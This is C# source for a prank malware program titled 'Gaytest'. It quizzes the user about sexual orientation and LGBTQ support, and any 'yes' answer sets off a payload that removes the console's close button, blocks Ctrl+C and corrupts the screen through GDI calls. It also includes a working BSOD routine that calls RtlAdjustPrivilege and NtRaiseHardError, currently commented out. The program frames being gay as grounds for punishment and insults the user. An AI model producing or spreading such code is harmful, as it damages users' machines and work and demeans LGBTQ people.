using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Media;
using System.IO;
using System.Reflection;
using System.Drawing.Imaging;

namespace Gaytest
{
    internal class Program
    {
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);


        [DllImport("user32.dll")]
        static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);

        [DllImport("user32.dll")]
        static extern int RemoveMenu(IntPtr hMenu, uint uPosition, uint uFlags);

        // Define constants
        const uint MF_BYCOMMAND = 0x00000000;
        const uint SC_CLOSE = 0xF060;


        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
        CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
        out IntPtr piSmallVersion, int amountIcons);

        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
        int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);

        public enum TernaryRasterOperations
        {
            SRCCOPY = 0x00CC0020,
            SRCPAINT = 0x00EE0086,
            SRCAND = 0x008800C6,
            SRCINVERT = 0x00660046,
            SRCERASE = 0x00440328,
            NOTSRCCOPY = 0x00330008,
            NOTSRCERASE = 0x001100A6,
            MERGECOPY = 0x00C000CA,
            MERGEPAINT = 0x00BB0226,
            PATCOPY = 0x00F00021,
            PATPAINT = 0x00FB0A09,
            PATINVERT = 0x005A0049,
            DSTINVERT = 0x00550009,
            BLACKNESS = 0x00000042,
            WHITENESS = 0x00FF0062,
        }



        public static Icon Extract(string file, int number, bool largeIcon)
        {
            IntPtr large;
            IntPtr small;
            ExtractIconEx(file, number, out large, out small, 1);
            try
            {
                return Icon.FromHandle(largeIcon ? large : small);
            }
            catch
            {
                return null;
            }
        }


        static void Main(string[] args)
        {

            Console.CancelKeyPress += new ConsoleCancelEventHandler(Console_CancelKeyPress);

            IntPtr consoleWindow = GetConsoleWindow();

            // Get the system menu of the console window
            IntPtr systemMenu = GetSystemMenu(consoleWindow, false);

            // Remove the close button from the system menu
            RemoveMenu(systemMenu, SC_CLOSE, MF_BYCOMMAND);

            bool q1;
            bool q2;
            bool q3;

            Console.Title = "Gaytest";
            Console.CursorVisible = false;
            

            Console.WriteLine("Gaytest:");
            Console.WriteLine("Press enter to start test.");
            while (Console.ReadKey(true).Key != ConsoleKey.Enter) { }



            Console.WriteLine("Question 1:");
            Console.WriteLine("Do you like men? (y/n)");

            do
            {
                ConsoleKeyInfo keyInfo = Console.ReadKey(true);
                if (keyInfo.Key == ConsoleKey.Y)
                {
                    q1 = true;
                    break;
                }
                else if (keyInfo.Key == ConsoleKey.N)
                {
                    q1 = false;
                    break;
                }
                else
                {
                    Console.WriteLine("Press a valid button dumbass");
                }

            } while (true);

            Console.WriteLine("Question 2:");
            Console.WriteLine("Do you support LGBTQ? (y/n)");

            do
            {
                ConsoleKeyInfo keyInfo = Console.ReadKey(true);
                if (keyInfo.Key == ConsoleKey.Y)
                {
                    q2 = true;
                    break;
                }
                else if (keyInfo.Key == ConsoleKey.N)
                {
                    q2 = false;
                    break;
                }
                else
                {
                    Console.WriteLine("Press a valid button dumbass");
                }

            } while (true);

            Console.WriteLine("Question 3:");
            Console.WriteLine("Are you gay? (y/n)");

            do
            {
                ConsoleKeyInfo keyInfo = Console.ReadKey(true);
                if (keyInfo.Key == ConsoleKey.Y)
                {
                    q3 = true;
                    break;
                }
                else if (keyInfo.Key == ConsoleKey.N)
                {
                    q3 = false;
                    break;
                }
                else
                {
                    Console.WriteLine("Press a valid button dumbass");
                }

            } while (true);

            Console.Clear();
            Console.SetCursorPosition(0, 0);
            Console.Write("Calcutaing gayness...");
            Console.SetCursorPosition(1, 1);

            for (int i = 0; i < 100; i++)
            {
                Console.Write("[");
                for (int y = 0; y < i; y = y + 4)
                {
                    //Rename "pb" to "progBar" later or else
                    //string pb = "\u2551";
                    string pb = "█▒";
                    Console.Write(pb);
                }
                Console.Write("]" + (i + 1 + " / 100%"));
                Console.SetCursorPosition(0, 1);
                //Console.ForegroundColor = ConsoleColor.Red;
                Thread.Sleep(200);
            }

            Console.Clear();
            if (q1 == true || q2 == true || q3 == true)
            {
                Console.WriteLine("100% gay");
                MessageBox.Show("You are 100% gay. Destroying pc...", "Gay alert", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                PostGayEx();
            }
            else
            {
                Console.WriteLine("not gay");
                MessageBox.Show("You are 0% gay.", "Good job!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                PostNotGayEx();
            }
        }

        static void PostNotGayEx()
        {
            System.Threading.Thread.Sleep(1000);
            Console.WriteLine("Exiting in 5");
            System.Threading.Thread.Sleep(1000);
            Console.Clear();
            Console.WriteLine("Exiting in 4");
            System.Threading.Thread.Sleep(1000);
            Console.Clear();
            Console.WriteLine("Exiting in 3");
            System.Threading.Thread.Sleep(1000);
            Console.Clear();
            Console.WriteLine("Exiting in 2");
            System.Threading.Thread.Sleep(1000);
            Console.Clear();
            Console.WriteLine("Exiting in 1");
            System.Threading.Thread.Sleep(1000);
            Environment.Exit(1);
        }

        static async void PostGayEx()
        {
            DialogResult aas = MessageBox.Show("Your pc is being destroyed in 5 seconds. If you try to open task manager or try to kill the program in other ways, your pc will crash instantly!",
                "Info", MessageBoxButtons.OKCancel, MessageBoxIcon.Information);
            if (aas == DialogResult.Cancel) { MessageBox.Show("Nuh uh", "Nuh uh", MessageBoxButtons.OK, MessageBoxIcon.Hand); }

            System.Threading.Thread.Sleep(1000);
            Console.WriteLine("Destroying pc in 5");
            System.Threading.Thread.Sleep(1000);
            Console.Clear();
            Console.WriteLine("Destroying pc in 4");
            System.Threading.Thread.Sleep(1000);
            Console.Clear();
            Console.WriteLine("Destroying pc in 3");
            System.Threading.Thread.Sleep(1000);
            Console.Clear();
            Console.WriteLine("Destroying pc in 2");
            System.Threading.Thread.Sleep(1000);
            Console.Clear();
            Console.WriteLine("Destroying pc in 1");
            System.Threading.Thread.Sleep(1000);

            CursorJupid(20);
            ShakeCursor();
            Thread.Sleep(10000);
            WindowJupid(100);
            Thread.Sleep(6000);
            outro();
            Thread.Sleep(4000);
            FlipScreen(500);
            Thread.Sleep(5000);
            InvertScreen(100);
            InvertScreen(10);
            Thread.Sleep(1000);
            //BSOD();
            MessageBox.Show("BSOD");


            //InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
        }

        public static void outro()
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            string soundFilePath = "Gaytest.outro.wav";
            Stream stream2 = assembly.GetManifestResourceStream(soundFilePath);
            SoundPlayer player = new SoundPlayer(stream2);
            //await Task.Run(() => player.Play());
            player.Play();
        }

        public static void BSOD()
        {
            Boolean t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
        }


        public static async Task FlipScreen(int aeg)
        {
            await Task.Run(() =>
            {

                for (int i = 0; i < 15; i++)
                {
                    Random r = new Random();
                    IntPtr hwnd = GetDesktopWindow();
                    IntPtr hdc = GetWindowDC(hwnd);
                    int x = Screen.PrimaryScreen.Bounds.Width;
                    int y = Screen.PrimaryScreen.Bounds.Height;
                    StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                    StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                    StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                    Thread.Sleep(aeg);
                }

            });
        }

        public static async Task InvertScreen(int aeg)
        {
            await Task.Run(() =>
            {

                for (int i = 0; i < 40; i++)
                {
                    Random r = new Random();
                    IntPtr hwnd = GetDesktopWindow();
                    IntPtr hdc = GetWindowDC(hwnd);
                    int x = Screen.PrimaryScreen.Bounds.Width;
                    int y = Screen.PrimaryScreen.Bounds.Height;
                    StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
                    Thread.Sleep(aeg);
                }

            });
        }

        public static async Task WindowJupid(int aeg)
        {
            await Task.Run(() =>
            {

                for (int i = 0; i < 50; i++)
                {
                    Random r = new Random();
                    IntPtr hwnd = GetDesktopWindow();
                    IntPtr hdc = GetWindowDC(hwnd);
                    int x = Screen.PrimaryScreen.Bounds.Width;
                    int y = Screen.PrimaryScreen.Bounds.Height;
                    StretchBlt(hdc, r.Next(x), r.Next(y), x = r.Next(500), y = r.Next(500), hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
                    Thread.Sleep(aeg);
                }

            });

        }

        public static async Task CursorJupid(int aeg)
        {
            Icon icon = Extract("shell32.dll", 237, true);
            await Task.Run(() =>
            {

                for (int i = 0; i < 2000; i++)
                {
                    Random r = new Random();
                    Cursor cursor = new Cursor(Cursor.Current.Handle);
                    int posX = Cursor.Position.X;
                    int posY = Cursor.Position.Y;

                    IntPtr desktop = GetWindowDC(IntPtr.Zero);
                    using (Graphics g = Graphics.FromHdc(desktop))
                    {
                        g.DrawIcon(icon, posX, posY);
                    }
                    Thread.Sleep(aeg);
                }

            });
        }

        public static async Task ShakeCursor()
        {

            int shakeIntensity = 5;
            Random random = new Random();
            await Task.Run(() =>
            {

                for (int i = 0; i < 1500; i++)
                {
                    int offsetX = random.Next(-shakeIntensity, shakeIntensity + 1);
                    int offsetY = random.Next(-shakeIntensity, shakeIntensity + 1);

                    Cursor.Position = new Point(Cursor.Position.X + offsetX, Cursor.Position.Y + offsetY);
                    Thread.Sleep(10);
                }

            });
        }
        static void Console_CancelKeyPress(object sender, ConsoleCancelEventArgs e)
        {
            // Cancel the key press (which would normally close the console)
            e.Cancel = true;

            // Display a message indicating that closing is disabled
            Console.WriteLine("Closing the console window is disabled.");
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetConsoleWindow();
    }
}
